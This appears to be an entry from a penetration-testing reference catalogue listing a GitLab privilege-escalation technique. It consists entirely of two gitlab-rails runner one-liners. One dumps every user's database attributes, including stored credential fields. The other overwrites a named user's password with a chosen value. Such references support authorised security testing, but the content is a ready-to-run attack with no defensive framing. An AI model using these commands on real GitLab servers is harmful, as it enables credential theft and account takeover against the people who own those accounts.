---
functions:
  privilege-escalation:
    - description: Simple Gitlab Enumeration
      code: |
        Dump the Database:
        gitlab-rails runner 'User.where.not(username: "peasssssssss").each { |u| pp u.attributes }'

        Change Passwords:
        gitlab-rails runner 'user = User.find_by(name: "dude"); user.password = "adminpassword"; user.password_confirmation = "adminpassword"; user.save!'
---
